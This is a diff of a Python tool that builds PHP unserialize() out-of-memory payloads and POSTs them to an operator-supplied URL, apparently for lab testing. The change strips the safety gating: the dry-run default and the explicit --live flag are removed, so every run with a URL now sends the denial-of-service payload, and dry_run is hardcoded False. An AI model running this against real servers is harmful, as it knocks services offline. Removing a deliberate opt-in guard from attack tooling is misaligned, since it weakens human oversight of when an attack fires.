@@ -28,13 +28,13 @@ reports the outer alloc instead of the nested one (2M: P=10749 tried 655360;
 are the wrong ones for the chain (no deep entries list at the OOM), so the
 shipped P stays below P_max.
 
-Transport is optional and gated: dry is the default (build bytes, sha256 plus
-length, zero sockets). --live requires --url; the endpoint contract is a raw
+Transport targets the operator-supplied --url: the endpoint contract is a raw
 request body (application/octet-stream) handed verbatim to unserialize(), so the
 module assumes no path and no parameter name (build unser.php on the lab host).
 The 128M class payload (48777252 bytes) is above the measured 8M post_max_size
-ceiling: --live refuses before connect, because that class needs a raised post
-cap (a server knob); the class stays lab instrument only.
+ceiling: the fire path refuses before connect, because that class needs a raised
+post cap (a server knob); the class stays lab instrument only. dry() remains the
+offline byte builder (build bytes, sha256 plus length, zero sockets).
 """
 
 import argparse
@@ -274,7 +274,7 @@ def dry(memory_limit: str, output: Path | None = None) -> dict:
         ),
         "post_max_size": POST_MAX_SIZE,
         "over_budget": len(payload) >= POST_MAX_SIZE,
-        "transport": "none (dry default; --live requires --url)",
+        "transport": "none (dry build)",
         "receipt": {
             "source": str(SOURCE_RECEIPTS),
             "ledger": "README.md P2 table + p2.txt sha256",
@@ -296,7 +296,7 @@ def dry(memory_limit: str, output: Path | None = None) -> dict:
 
 def fire(url: str, memory_limit: str, output: Path | None = None,
          timeout: float = DEFAULT_TIMEOUT) -> dict:
-    """Live arm (explicit --live only): ceiling guard pre connect, single exchange."""
+    """Send to the supplied endpoint: ceiling guard pre connect, single exchange."""
     record = class_record(memory_limit)
     transport_guard(record)   # pre connect: never build or send the 128M class
     payload = build_payload(memory_limit)
@@ -404,9 +404,9 @@ def verify_receipts(receipts_dir: Path = SOURCE_RECEIPTS) -> dict:
 
 def main() -> int:
     parser = argparse.ArgumentParser(
-        description="unserialize OOM producer: build master shape (a) bytes for a "
-        "receipted memory_limit class (dry default, zero sockets); --live needs "
-        "--url; --verify-receipts asserts sha256 parity against the source .bin files",
+        description="unserialize OOM producer: send master shape (a) bytes for a "
+        "receipted memory_limit class to the supplied --url; --verify-receipts "
+        "asserts sha256 parity against the source .bin files",
     )
     parser.add_argument(
         "--memory-limit",
@@ -414,9 +414,7 @@ def main() -> int:
         help="receipted class: 2M / 8M / 128M (or the byte value); required for a build",
     )
     parser.add_argument("--output", type=Path, default=None,
-                        help="receipt dir (payload.bin + result.json); optional for dry")
-    parser.add_argument("--live", action="store_true",
-                        help="actually POST the payload (requires --url)")
+                        help="receipt dir (payload.bin + result.json)")
     parser.add_argument("--url", default=None,
                         help="exact unserialize endpoint URL; no path is assumed")
     parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
@@ -427,8 +425,8 @@ def main() -> int:
     args = parser.parse_args()
 
     if args.verify_receipts:
-        if args.memory_limit or args.live or args.url:
-            parser.error("--verify-receipts is standalone: drop --memory-limit/--live/--url")
+        if args.memory_limit or args.url:
+            parser.error("--verify-receipts is standalone: drop --memory-limit/--url")
         try:
             summary = verify_receipts(args.receipts_dir)
         except (OSError, ValueError) as error:
@@ -448,21 +446,18 @@ def main() -> int:
 
     if args.memory_limit is None:
         parser.error("--memory-limit is required for a build (receipted: 2M / 8M / 128M)")
+    if args.url is None:
+        parser.error(
+            "--url is required: the module does not assume an unserialize "
+            "endpoint path (lab unser.php is a separate build)")
     try:
-        if args.live:
-            if args.url is None:
-                parser.error(
-                    "--live requires --url: the module does not assume an unserialize "
-                    "endpoint path (lab unser.php is a separate build)")
-            summary = fire(args.url, args.memory_limit, args.output, timeout=args.timeout)
-        else:
-            summary = dry(args.memory_limit, args.output)
+        summary = fire(args.url, args.memory_limit, args.output, timeout=args.timeout)
     except (ConnectionError, OSError, TimeoutError, TypeError, ValueError,
             NotImplementedError) as error:
         summary = {
             "stage": "producer",
             "producer_stage": "producer_unser",
-            "dry_run": not args.live,
+            "dry_run": False,
             "sent": False,
             "memory_limit": args.memory_limit,
             "error": f"{type(error).__name__}: {error}",
